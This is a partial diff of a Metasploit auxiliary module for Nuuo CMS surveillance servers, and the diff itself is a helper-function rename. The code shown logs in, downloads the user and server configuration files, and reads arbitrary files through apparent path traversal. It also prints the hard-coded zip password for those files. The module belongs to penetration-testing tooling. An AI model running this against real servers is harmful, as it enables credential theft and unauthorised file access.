@@ -39,8 +39,8 @@ class MetasploitModule < Msf::Auxiliary
           [ 'URL', 'GITHUB_URL_TODO' ]
 
         ],
-      'Platform'       => ['win'],
-      'Privileged'     => true,
+      'Platform'        => ['win'],
+      'Privileged'      => true,
       'DisclosureDate'  => 'Oct 11 2018'))
 
     register_options(
@@ -52,19 +52,19 @@ class MetasploitModule < Msf::Auxiliary
 
 
   def run
-    login
+    nucs_login
 
-    if @session == nil
+    if @nucs_session == nil
       fail_with(Failure::Unknown, "Failed to login to Nuuo CMS")
     end
 
-    cmserver = download_file('CMServer.cfg', true)
+    cmserver = nucs_download_file('CMServer.cfg', true)
     # Once zip extraction is working change application/zip to text/plain
     path = store_loot("CMServer.cfg", "application/zip", datastore['RHOST'],
                       cmserver, 'CMServer.cfg', "Nuuo CMS user configuration file")
     print_good("Downloaded Nuuo CMS user configuration file to #{path}")
 
-    serverconfig = download_file('ServerConfig.cfg', true)
+    serverconfig = nucs_download_file('ServerConfig.cfg', true)
     # Once zip extraction is working change application/zip to text/plain
     path = store_loot("ServerConfig.cfg", "application/zip", datastore['RHOST'],
                       serverconfig, 'ServerConfig.cfg', "Nuuo CMS server configuration file")
@@ -80,7 +80,7 @@ password NUCMS2007! to unzip them.")
     print_status("Annoy the Metasploit developers until this gets fixed!")
 
     if datastore['FILE'] != nil
-      filedata = download_file(datastore['FILE'])
+      filedata = nucs_download_file(datastore['FILE'])
       filename = datastore['FILE'].gsub('..\\', '')
       path = store_loot(filename, "application/octet-stream", datastore['RHOST'],
                         filedata, filename, "File downloaded from Nuuo CMS server")
